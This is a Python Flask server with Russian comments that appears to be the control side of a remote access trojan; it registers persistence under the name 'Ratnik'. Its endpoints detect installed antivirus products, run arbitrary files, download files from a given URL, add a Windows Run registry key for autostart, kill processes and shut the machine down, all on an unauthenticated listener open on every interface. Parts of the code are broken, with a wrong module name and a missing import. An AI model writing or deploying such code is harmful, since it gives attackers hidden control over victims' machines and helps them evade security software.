from flask import Flask, request, jsonify
import threading
import psutil
import os
import winreg as reg
import subprocess

app = Flask(__name__)

# Словарь для хранения данных о клиентах (node_name -> client_info)
clients = {}

# Метод для записи информации о клиенте
@app.route('/log', methods=['POST'])
def log_user_info():
    data = request.json
    node_name = data['Node Name']
    
    clients[node_name] = data
    print(f"Клиент с node name {node_name} добавлен или обновлен.")
    return jsonify({"status": "success"}), 200

# Метод для получения списка всех клиентов
@app.route('/list_clients', methods=['GET'])
def list_clients():
    if not clients:
        return jsonify({"message": "Нет подключенных клиентов."}), 200
    else:
        clients_list = {node_name: info['Execution Time'] for node_name, info in clients.items()}
        return jsonify(clients_list), 200

# Метод для получения информации о конкретном клиенте
@app.route('/system_info/<node_name>', methods=['GET'])
def get_system_info(node_name):
    if node_name not in clients:
        return jsonify({"message": f"Клиент с node name {node_name} не найден."}), 404
    else:
        return jsonify(clients[node_name]), 200

# Метод для получения запущенных процессов
@app.route('/processes/<node_name>', methods=['GET'])
def get_processes(node_name):
    if node_name not in clients:
        return jsonify({"message": f"Клиент с node name {node_name} не найден."}), 404
    
    process_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        process_list.append(f"{proc.info['pid']} - {proc.info['name']}")
    return jsonify({"result": '\n'.join(process_list)}), 200

# Метод для проверки антивирусов
@app.route('/antiviruses/<node_name>', methods=['GET'])
def check_antivirus(node_name):
    if node_name not in clients:
        return jsonify({"message": f"Клиент с node name {node_name} не найден."}), 404
    
    antivirus_paths = {
        r'C:\Program Files\Windows Defender': 'Windows Defender',
        r'C:\Program Files (x86)\Avira\Launcher': 'Avira',
        r'C:\Program Files (x86)\IObit\Advanced sysCare': 'Advanced sysCare',
        r'C:\Program Files\Bitdefender Antivirus Free': 'Bitdefender',
        r'C:\Program Files\DrWeb': 'Dr.Web',
        r'C:\Program Files\ESET\ESET Security': 'ESET',
        r'C:\Program Files (x86)\Kaspersky Lab': 'Kaspersky Lab',
        r'C:\Program Files (x86)\360\Total Security': '360 Total Security',
        r'C:\Program Files\ESET\ESET NOD32 Antivirus': 'ESET NOD32'
    }
    found_antiviruses = []
    for path, name in antivirus_paths.items():
        if os.path.exists(path):
            found_antiviruses.append(name)
    return jsonify({"result": '\n'.join(found_antiviruses)}), 200

# Метод для запуска файла в указанной директории
@app.route('/run_file/<node_name>', methods=['POST'])
def run_file_in_directory(node_name):
    if node_name not in clients:
        return jsonify({"message": f"Клиент с node name {node_name} не найден."}), 404
    
    data = request.json
    directory = data.get('directory')
    filename = data.get('filename')
    file_path = os.path.join(directory, filename)
    if os.path.exists(file_path):
        subprocess.Popen([file_path], shell=True)
        return jsonify({"result": f"Файл {filename} запущен из директории {directory}"}), 200
    else:
        return jsonify({"result": f"Файл {filename} не найден в директории {directory}"}), 404

# Метод для отправки файла в указанную директорию
@app.route('/send_file/<directory>', methods=['POST'])
def handle_send_file(directory):
    data = request.json
    file_url = data.get('file_url')
    
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    response = requests.get(file_url)
    if response.status_code == 200:
        file_name = file_url.split('/')[-1]
        file_path = os.path.join(directory, file_name)
        with open(file_path, 'wb') as f:
            f.write(response.content)
        return jsonify({"result": f"Файл {file_name} успешно сохранен в {directory}"}), 200
    else:
        return jsonify({"result": "Не удалось скачать файл"}), 500

# Метод для добавления в автозапуск
@app.route('/add_startup', methods=['POST'])
def add_to_startup():
    data = request.json
    file_path = data.get('file_path')
    
    key = winreg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(open_key, "Ratnik", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(open_key)
        return jsonify({"result": f"Добавлено в автозапуск: {file_path}"}), 200
    except Exception as e:
        return jsonify({"result": f"Ошибка при добавлении в автозапуск: {str(e)}"}), 500

# Метод для выключения компьютера
@app.route('/shutdown/<node_name>', methods=['POST'])
def shutdown_computer(node_name):
    if node_name not in clients:
        return jsonify({"message": f"Клиент с node name {node_name} не найден."}), 404
    
    os.system("shutdown /s /t 1")
    return jsonify({"result": "Компьютер будет выключен"}), 200

# Метод для закрытия процесса
@app.route('/kill_process/<node_name>', methods=['POST'])
def kill_process(node_name):
    if node_name not in clients:
        return jsonify({"message": f"Клиент с node name {node_name} не найден."}), 404
    
    data = request.json
    identifier = data.get('identifier')
    try:
        if identifier.isdigit():
            pid = int(identifier)
            p = psutil.Process(pid)
            p.terminate()
            return jsonify({"result": f"Процесс с PID {pid} был успешно завершен."}), 200
        else:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == identifier:
                    proc.terminate()
                    return jsonify({"result": f"Процесс '{identifier}' был успешно завершен."}), 200
            return jsonify({"result": f"Процесс '{identifier}' не найден."}), 404
    except Exception as e:
        return jsonify({"result": str(e)}), 500

# Запуск сервера
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)